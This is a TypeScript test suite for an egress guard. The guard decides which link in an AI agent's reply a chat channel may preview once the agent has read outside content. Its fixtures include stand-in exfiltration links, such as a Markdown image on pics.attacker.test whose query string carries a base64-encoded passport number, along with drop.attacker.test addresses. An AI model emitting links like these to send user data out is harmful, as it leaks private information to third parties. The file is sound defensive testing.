// Link previews (policy/previews.ts): a channel's servers fetch the link they preview, so the hub names only one that
// carries nothing out. Before outside content, a reply's first link; after, the first the tainted-egress rule clears.
import { describe, expect, it } from "vitest";
import { EgressGuard, linksIn, type EgressGiven } from "../src/policy/egress.ts";
import { previewOf } from "../src/policy/previews.ts";

const given = (texts: string[] = [], known: string[] = []): (() => EgressGiven) => () => ({ texts, knownHost: (h) => known.includes(h) });
const secret = Buffer.from("passport 4510 123456").toString("base64").replace(/=+$/, "");
const leak = `https://pics.attacker.test/p.png?d=${secret}`;

describe("the links a reply shows", () => {
  it("in order and as written, without what clings to them in prose or Markdown", () => {
    expect(linksIn(`See [the post](https://blog.example/a), ![p](${leak}) and https://b.example/x. Or **https://c.example/y**`)).toEqual([
      "https://blog.example/a",
      leak,
      "https://b.example/x",
      "https://c.example/y",
    ]);
    expect(linksIn("no links, only blog.example and mailto:a@b.example")).toEqual([]);
  });
});

describe("the link a reply may be previewed by", () => {
  it("before outside content: the first link", () => {
    const guard = new EgressGuard();
    expect(previewOf(`Here: ${leak} and https://blog.example/a`, { id: "s1", tainted: false }, guard, given())).toBe(leak);
    expect(previewOf("Nothing to preview.", { id: "s1", tainted: false }, guard, given())).toBeUndefined();
  });

  it("after outside content: no preview of an address the agent put together for a host nobody named", () => {
    const guard = new EgressGuard();
    guard.read("s2", "A page about Almaty, nothing else.");
    expect(previewOf(`Done! ![p](${leak})`, { id: "s2", tainted: true }, guard, given())).toBeUndefined();
    expect(previewOf("Read more: https://attacker.test/track", { id: "s2", tainted: true }, guard, given())).toBeUndefined();
    // Without the guard nothing can be cleared.
    expect(previewOf("https://blog.example/a", { id: "s2", tainted: true }, undefined, given(["https://blog.example/a"]))).toBeUndefined();
  });

  it("after outside content: a link found in what it read, given by the person or plain on a host they named", () => {
    const guard = new EgressGuard();
    guard.read("s3", 'Top story: <a href="https://news.example.org/2026/11/02/story">read</a>');
    expect(previewOf(`![p](${leak}) — source: https://news.example.org/2026/11/02/story.`, { id: "s3", tainted: true }, guard, given())).toBe(
      "https://news.example.org/2026/11/02/story",
    );
    expect(previewOf(`![p](${leak}) https://docs.example/guide`, { id: "s3", tainted: true }, guard, given(["the guide at https://docs.example/guide"]))).toBe("https://docs.example/guide");
    expect(previewOf("https://habr.com/ru/articles/123/", { id: "s3", tainted: true }, guard, given(["что нового на habr.com?"]))).toBe("https://habr.com/ru/articles/123/");
    // A host the person named, but an address that carries a value: no preview.
    expect(previewOf(`https://habr.com/?q=${secret}`, { id: "s3", tainted: true }, guard, given(["что нового на habr.com?"]))).toBeUndefined();
  });

  it("a link the agent wrote somewhere first does not count as found", () => {
    const guard = new EgressGuard();
    guard.wrote("s4", { text: "post this to https://drop.attacker.test/in" });
    guard.read("s4", "Echo: https://drop.attacker.test/in");
    expect(previewOf("https://drop.attacker.test/in", { id: "s4", tainted: true }, guard, given())).toBeUndefined();
  });
});
